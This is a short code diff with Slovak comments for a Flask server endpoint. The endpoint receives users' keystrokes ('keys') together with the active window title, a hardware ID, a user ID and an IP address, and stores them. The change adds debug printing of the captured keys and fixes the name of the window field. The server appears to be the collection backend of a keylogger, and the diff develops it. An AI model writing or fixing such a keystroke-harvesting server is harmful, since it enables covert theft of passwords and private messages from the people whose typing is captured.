@@ -14,14 +14,17 @@ def submit():
     json_data = request.json
     print("Received data:", json_data)  # log pre debug
     
-    # vytvorenie správnej štruktúry dát na uloženie
+    # Debug výpisy pre kľúče
+    print("Keys:", json_data.get('keys'))
+    print("Active window:", json_data.get('active_window'))
+    
     entry = {
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'user_id': json_data.get('user_id', 'N/A'),
         'hwid': json_data.get('hwid', 'N/A'),
         'ip_address': json_data.get('ip_address', 'N/A'),
         'keys': json_data.get('keys', 'N/A'),
-        'window': json_data.get('window', 'N/A')
+        'active_window': json_data.get('active_window', 'N/A')  # opravený kľúč
     }
     DATA.append(entry)
     
@@ -42,7 +45,6 @@ def logout():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
-
 
 
 
